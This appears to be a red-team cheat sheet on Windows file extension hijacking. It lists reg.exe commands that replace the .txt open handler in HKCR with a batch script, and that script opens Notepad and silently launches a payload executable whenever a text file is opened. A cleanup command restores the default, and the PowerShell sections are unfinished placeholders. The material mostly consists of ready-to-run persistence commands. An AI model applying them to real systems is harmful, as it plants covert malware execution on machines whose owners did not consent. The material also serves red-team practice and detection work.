# File Extension Hijacking

## 01 - Exploit

### 1.1 - Command Prompt

```
C:\> reg.exe query "HKCR\txtfile\shell\open\command"

HKEY_CLASSES_ROOT\txtfile\shell\open\command
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\NOTEPAD.EXE %1
```

Prepare the payload.

```batch
@echo off
start notepad.exe %1
start C:\path\to\payload.exe
```

Overwrite the registry value.

```
C:\> reg.exe add "HKCR\txtfile\shell\open\command" /t REG_EXPAND_SZ /d "C:\path\to\payload.bat" /f
```

### 1.2 - PowerShell

```
PS C:\> TODO: Convert the command prompt to cmdlet
```

## 02 - Cleanup

### 2.1 - Command Prompt

```
C:\> reg.exe add "HKCR\txtfile\shell\open\command" /t REG_EXPAND_SZ /d "%SystemRoot%\system32\NOTEPAD.EXE %1" /f
```

### 2.2 - PowerShell

```
PS C:\> TODO: Convert the command prompt to cmdlet
```

---
## References

### Persistence Info

- [Persistence Info: File Extension Hijacking](https://persistence-info.github.io/Data/fileextensionhijacking.html)

### Red Team Notes

- [Red Team Notes: Hijacking Default File Extension](https://www.ired.team/offensive-security/persistence/hijacking-default-file-extension)

### DMCXBlue

- [DMCXBlue: Default File Association](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1546-event-triggered-execution/default-file-association)